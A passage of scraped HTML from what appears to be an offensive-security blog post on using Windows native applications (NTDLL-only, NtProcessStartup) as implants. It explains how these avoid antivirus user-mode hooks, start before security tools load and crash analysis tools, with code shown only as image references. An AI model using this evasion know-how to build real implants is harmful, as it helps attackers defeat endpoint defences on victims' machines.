0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></figure></div></div></div><div type="image" data-hook="rcv-block30"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-cvcl91552"><span class="vMus0"><span style="font-size:14px"><span>Figure 4 - Csrss.exe is a Native Application</span></span></span></p></div><div type="paragraph" data-hook="rcv-block31"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-bwhkj46313"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block32"></div><div data-breakout="normal"><h3 class="CwsM- nAEMg Z7lok X7MWW" dir="auto" id="viewer-9mk1h15183"><span class="-pTyw"><strong style="font-weight:700"><span style="font-size:18px"><span style="color:#fd6262;text-decoration:inherit"><span>What are Native Applications?</span></span></span></strong></span></h3></div><div type="heading" data-hook="rcv-block33"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-o807615185"><span class="vMus0"><span>Native applications are those which do not interface with any subsystem and are therefore constrained to operating with the functions available in NTDLL.DLL. Native applications of this type have some advantages and disadvantages that we need to closely examine as we look to apply them in the context of offensive tool development.</span></span></p></div><div type="paragraph" data-hook="rcv-block34"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-p8dit15187"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block35"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-r25f743464"><span class="vMus0"><strong style="font-weight:700"><span style="color:#fd6262;text-decoration:inherit"><span>Advantages</span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block36"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-r80lq15189"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block37"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-yzx7w45240"><span class="vMus0"><span>By removing the Windows API layer and Windows Subsystem dll dependencies we can improve the raw performance of our application. This benefit is marginal, but if you’re seeking to exploit race conditions or perform a large number of operations this benefit may interest you.</span></span></p></div><div type="paragraph" data-hook="rcv-block38"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-4ipsg48050"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block39"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-o7r4j15191"><span class="vMus0"><span>Additionally, removing those dependencies on KERNEL32 and KERNELBASE results in leaner executables. Our Import Address Table (IAT) only imports from NTDLL, so we can reduce excessive bulkiness that come with including other imports.</span></span></p></div><div type="paragraph" data-hook="rcv-block40"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-r499250354"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block41"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-c7vd915193"><span class="vMus0"><span>By interacting with the NtAPI directly we can potentially access functionality that would not be available through the WinAPI that most applications use. This is something that several malware techniques rely on, and so this benefit is a carryover from the dynamic resolution of NtAPI that we commonly see in Windows subsystem executables.</span></span></p></div><div type="paragraph" data-hook="rcv-block42"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-5edux52148"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block43"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-1qxee15195"><span class="vMus0"><span style="color:#8a8a8a;text-decoration:inherit"><span>From an offensive tool development perspective, Native Applications are seemingly immune to user mode hooking. Because Native Applications cannot load the Windows subsystem dlls that security solutions use to insert user mode hooks, our Native Application can inherently bypass those user mode hooks.</span></span></span></p></div><div type="paragraph" data-hook="rcv-block44"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-qumtq53948"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block45"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-x5ht015197"><span class="vMus0"><span>Finally, there’s some unique potential to interact with Windows at earlier stages of the Windows boot process that normal Windows applications, including user mode debuggers, cannot interact with. This presents a unique opportunity to initiate malicious actions before security solutions are properly initiated on a target system.</span></span></p></div><div type="paragraph" data-hook="rcv-block46"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-2en0g15199"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block47"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-aex3y56276"><span class="vMus0"><strong style="font-weight:700"><span style="color:#fd6262;text-decoration:inherit"><span>Disadvantages</span></span></strong></span></p></div><div type="paragraph" data-hook="rcv-block48"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-5rk0658088"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block49"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-a1eb915201"><span class="vMus0"><span>Native applications cannot be started from Windows API. So double clicking on a native application, or trying to run a native application with cmd.exe will result in an error because these applications use some variant of the CreateProcess function from WinAPI to start processes. This makes initiating a native application more cumbersome that starting up a Windows Application:</span></span></p></div><div type="paragraph" data-hook="rcv-block50"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-shyhv1699"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block51"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-x0hvx1582"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:84;--dim-width:740;--ricos-image-default-border-color:unset" id="x0hvx1582" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-x0hvx1582"><wow-image id="0628ff_035124e9a8da47229ae681a180aa42b6~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;x0hvx1582&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:84,&quot;uri&quot;:&quot;0628ff_035124e9a8da47229ae681a180aa42b6~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG x0hvx1582" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_035124e9a8da47229ae681a180aa42b6~mv2.webp/v1/fill/w_133,h_15,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_035124e9a8da47229ae681a180aa42b6~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_035124e9a8da47229ae681a180aa42b6~mv2.webp/v1/fill/w_1036,h_118,al_c,lg_1,q_80/0628ff_035124e9a8da47229ae681a180aa42b6~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block52"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-drzns1533"><span class="vMus0"><span style="font-size:14px"><span>Figure 5 - Cmd.exe creates processes with the CreateProcessW API</span></span></span></p></div><div type="paragraph" data-hook="rcv-block53"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-phq5y59706"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block54"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-bpcq277019"><span class="vMus0"><span>Similarly, debuggers cannot initiate Native Applications. However, this protection is limited to the startup of our implant process, once the implant is running it can be debugged just like any other user mode process:</span></span></p></div><div type="paragraph" data-hook="rcv-block55"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-vfnjf1793"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block56"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-z8vev1826"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:80;--dim-width:740;--ricos-image-default-border-color:unset" id="z8vev1826" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-z8vev1826"><wow-image id="0628ff_9964cf503d8b46d38c30aee8e48a5f03~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;z8vev1826&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:80,&quot;uri&quot;:&quot;0628ff_9964cf503d8b46d38c30aee8e48a5f03~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG z8vev1826" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_9964cf503d8b46d38c30aee8e48a5f03~mv2.webp/v1/fill/w_133,h_14,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_9964cf503d8b46d38c30aee8e48a5f03~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_9964cf503d8b46d38c30aee8e48a5f03~mv2.webp/v1/fill/w_1036,h_112,al_c,lg_1,q_80/0628ff_9964cf503d8b46d38c30aee8e48a5f03~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block57"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-4jx9280924"><span class="vMus0"><span style="font-size:14px"><span>Figure 6 - Using WinAPI on a native application results in an error</span></span></span></p></div><div type="paragraph" data-hook="rcv-block58"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-mhvyx15209"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block59"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-g3n6g15211"><span class="vMus0"><span>Exasperating this limitation is that we cannot self-inject most shellcode from a Native process. Any shellcode that relies on WinAPI, or on loading dll dependencies will fail inside our native implant.</span></span></p></div><div type="paragraph" data-hook="rcv-block60"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-zgei968777"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block61"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-t8d4115213"><span class="vMus0"><span>But this disadvantage can also be an advantage because it means there’s an additional barrier to analysis that prevents defenders from looking at our implant’s functionality. Instrumentation that relies on loading DLLs into target executables for analysis, like </span><a target="_blank" href="https://github.com/hasherezade/tiny_tracer" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#fd6262;text-decoration:inherit"><span>TinyTracer</span></span></a><span>, will fail (5):</span></span></p></div><div type="paragraph" data-hook="rcv-block62"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-kcrko33076"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block63"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-bla0h2029"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:92;--dim-width:740;--ricos-image-default-border-color:unset" id="bla0h2029" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-bla0h2029"><wow-image id="0628ff_dc6c2ba8e3514e598d5bc37fff5183c2~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;bla0h2029&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:92,&quot;uri&quot;:&quot;0628ff_dc6c2ba8e3514e598d5bc37fff5183c2~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG bla0h2029" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_dc6c2ba8e3514e598d5bc37fff5183c2~mv2.webp/v1/fill/w_133,h_17,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_dc6c2ba8e3514e598d5bc37fff5183c2~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_dc6c2ba8e3514e598d5bc37fff5183c2~mv2.webp/v1/fill/w_1036,h_129,al_c,lg_1,q_80/0628ff_dc6c2ba8e3514e598d5bc37fff5183c2~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block64"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-fv7ij104309"><span class="vMus0"><span style="font-size:14px"><span>Figure 7  - TinyTracer crashes when analyzing a Native Application</span></span></span></p></div><div type="paragraph" data-hook="rcv-block65"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-mtm8u15219"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block66"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-x1ify110782"><span class="vMus0"><span>Another disadvantage is that NtAPI functions are always subject to change between Windows versions. So, there’s an inherent degree of instability we must accept when developing native applications, especially if we’re interested in supporting older Windows versions. However, this is mitigated by Microsoft’s high prioritization of backwards compatibility. Therefore, we can be reasonably sure that existing NtAPI functionality will continue to exist in the future.</span></span></p></div><div type="paragraph" data-hook="rcv-block67"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-emggj74023"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block68"></div><div data-breakout="normal"><h3 class="CwsM- nAEMg Z7lok X7MWW" dir="auto" id="viewer-t4wgv15221"><span class="-pTyw"><strong style="font-weight:700"><span style="font-size:24px"><span style="color:#fd6262;text-decoration:inherit"><span>Part II: Getting Started</span></span></span></strong></span></h3></div><div type="heading" data-hook="rcv-block69"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-z5dk215223"><span class="vMus0"><span>Before we can start compiling native applications, we need to define as much of their functionality as possible so that we can make it available for use in our code. The most popular resource for these definitions is System Informer’s (formerly Process Hacker) header files. For simplicity, I like to use an amalgamated version of those headers made available </span><a target="_blank" href="https://github.com/mrexodia/phnt-single-header" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#fd6262;text-decoration:inherit"><span>here</span></span></a><span style="color:#fd6262;text-decoration:inherit"><span>&nbsp;</span></span><span>(4).</span></span></p></div><div type="paragraph" data-hook="rcv-block70"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-bz9bw15227"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block71"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-dab7l92396"><span class="vMus0"><span>Normal Windows applications have a main, wmain, or WinMain type of function that the compiler and linker know to use as the entry point for code execution. Native applications use the name NtProcessStartup to achieve the same effect.</span></span></p></div><div type="paragraph" data-hook="rcv-block72"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-8mma815229"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block73"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-nm12n94772"><span class="vMus0"><span>So, to get started with an empty native executable, all we have to do is include the “phnt.h” file, and set up the NtProcessStartup function. Then it’s important to tell the linker that we want to link against ntdll, and that we’ll be making a native application by passing in the “Native” text to the Subsystem linker option:</span></span></p></div><div type="paragraph" data-hook="rcv-block74"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-nns612228"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block75"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-1jkpw145281"><div class="J9Vi9 mL-Fz"><figure class="OPDJf" data-hook="figure-IMAGE"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:242;--dim-width:1862;--ricos-image-default-border-color:unset" id="1jkpw145281" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-1jkpw145281"><wow-image id="0628ff_f8d287c0241643b1ba818b47ea95c563~mv2.png" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;1jkpw145281&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:1862,&quot;height&quot;:242,&quot;uri&quot;:&quot;0628ff_f8d287c0241643b1ba818b47ea95c563~mv2.png&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG 1jkpw145281" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_f8d287c0241643b1ba818b47ea95c563~mv2.png/v1/fill/w_49,h_6,al_c,q_85,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_f8d287c0241643b1ba818b47ea95c563~mv2.png" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_f8d287c0241643b1ba818b47ea95c563~mv2.png/v1/fill/w_1862,h_242,al_c,q_90/0628ff_f8d287c0241643b1ba818b47ea95c563~mv2.png" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></figure></div></div></div><div type="image" data-hook="rcv-block76"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-mydu32320"><span class="vMus0"><span style="font-size:14px"><span>Figure 8 - An empty Native Application with an inline assembly infinite loop</span></span></span></p></div><div type="paragraph" data-hook="rcv-block77"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-o4uho15234"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block78"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-nj5es152078"><span class="vMus0"><span>In the screenshot above, I implemented a quick inline assembly infinite loop, so we can attach a debugger to our Native Application after we initialize it. So, if we quickly compile it as both a Windows Application and a Native Application we can take a look at our implant inside a debugger and see some of the differences:</span></span></p></div><div type="paragraph" data-hook="rcv-block79"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-154gw36836"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block80"></div><div data-breakout="normal"><div class="i5TUk" id="viewer-b6nl62778"><div class="J9Vi9"><figure class="OPDJf" data-hook="figure-IMAGE"><a class="Vxa2D has-custom-focus LBfZl" tabindex="0" target="_self"><div data-hook="image-viewer" class="fnfJM"><div style="--dim-height:410;--dim-width:740;--ricos-image-default-border-color:unset" id="b6nl62778" class="_49X-U wNivC _8xVnn" data-hook="image-viewer-b6nl62778"><wow-image id="0628ff_55dc1147af564107b1f0520995ba1eff~mv2.webp" class="undefined tKegW" data-image-info="{&quot;containerId&quot;:&quot;b6nl62778&quot;,&quot;alignType&quot;:&quot;center&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;isLQIP&quot;:true,&quot;isSEOBot&quot;:false,&quot;lqipTransition&quot;:&quot;blur&quot;,&quot;encoding&quot;:&quot;AVIF&quot;,&quot;imageData&quot;:{&quot;width&quot;:740,&quot;height&quot;:410,&quot;uri&quot;:&quot;0628ff_55dc1147af564107b1f0520995ba1eff~mv2.webp&quot;,&quot;name&quot;:&quot;&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-motion-part="BG_IMG b6nl62778" data-bg-effect-name="" data-has-ssr-src="true" data-animate-blur="" data-is-responsive="true"><img src="https://static.wixstatic.com/media/0628ff_55dc1147af564107b1f0520995ba1eff~mv2.webp/v1/fill/w_133,h_74,al_c,q_80,usm_0.66_1.00_0.01,blur_2,enc_avif,quality_auto/0628ff_55dc1147af564107b1f0520995ba1eff~mv2.webp" alt="" style="width:100%;height:100%;object-fit:cover;object-position:50% 50%;max-width:100%;position:absolute;left:0;top:0" data-pin-url="https://www.protexity.com/post/going-native-malicious-native-applications" data-pin-media="https://static.wixstatic.com/media/0628ff_55dc1147af564107b1f0520995ba1eff~mv2.webp/v1/fill/w_888,h_492,al_c,lg_1,q_85/0628ff_55dc1147af564107b1f0520995ba1eff~mv2.webp" draggable="false"></wow-image></div><button class="KxJvA" type="button" data-hook="image-expand-button" aria-label="Expand image"><svg viewBox="0 0 19 19" xmlns="http://www.w3.org/2000/svg" class="C02F9"><path d="M15.071 8.371V4.585l-4.355 4.356a.2.2 0 0 1-.283 0l-.374-.374a.2.2 0 0 1 0-.283l4.356-4.355h-3.786a.2.2 0 0 1-.2-.2V3.2c0-.11.09-.2.2-.2H16v5.371a.2.2 0 0 1-.2.2h-.529a.2.2 0 0 1-.2-.2zm-6.5 6.9v.529a.2.2 0 0 1-.2.2H3v-5.371c0-.11.09-.2.2-.2h.529c.11 0 .2.09.2.2v3.786l4.355-4.356a.2.2 0 0 1 .283 0l.374.374a.2.2 0 0 1 0 .283L4.585 15.07h3.786c.11 0 .2.09.2.2z" fill="#000" fill-rule="nonzero"></path></svg></button></div></a></figure></div></div></div><div type="image" data-hook="rcv-block81"></div><div data-breakout="normal"><p class="Rc39c HhrTy RISpW X7MWW" dir="auto" id="viewer-b5puw2826"><span class="vMus0"><span style="font-size:14px"><span>Figure 9 - The antivirus solution deployed on this workstation is not able to load into our Native Application</span></span></span></p></div><div type="paragraph" data-hook="rcv-block82"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-4bgnm15239"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block83"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-q9brw100623"><span class="vMus0"><span>In the screenshot above, we can see that just by changing the subsystem, we were able to avoid this security application’s dlls, and their associated function hooking.</span></span></p></div><div type="paragraph" data-hook="rcv-block84"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-lyh8q1132897"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block85"></div><div data-breakout="normal"><p class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-yb0i515241"><span class="vMus0"><span>The last thing we need to validate before we can get started in earnest, is a way to detonate our Native Application. For the first part of this writeup, we’re going to be using </span><a target="_blank" href="https://github.com/zodiacon/winnativeapibooksamples/tree/main/Chapter03/nativerun" rel="noopener" class="eqTR9 JfUOL" data-hook="web-link"><span style="color:#fd6262;text-decoration:inherit"><span>NativeRun</span></span></a><span>&nbsp;by @Zodiacon to run our application. The NativeRun application works by calling the RtlCreateUserProcess NtAPI to initiate a Native Application successfully.</span></span></p></div><div type="paragraph" data-hook="rcv-block86"></div><div data-breakout="normal"><div class="Rc39c HhrTy Z7lok X7MWW" dir="auto" id="viewer-ciunx108870"><span class="vMus0"><br role="presentation"></span></div></div><div type="empty-line" data-hook="rcv-block87"></div><div data-breakout="normal"><h3 class="CwsM- nAEMg Z7lok X7MWW" dir="auto" id="viewer-ip5uu15245"><span class="-pTyw"><strong style="font-weight:700"><span style="font-size:24px"><span style="color:#fd6262;text-decoration:inherit"><span>Part Three: Diving In</span></span></span></strong></span></h3></div><div type="heading" data-hook="rcv-block88"></div><div 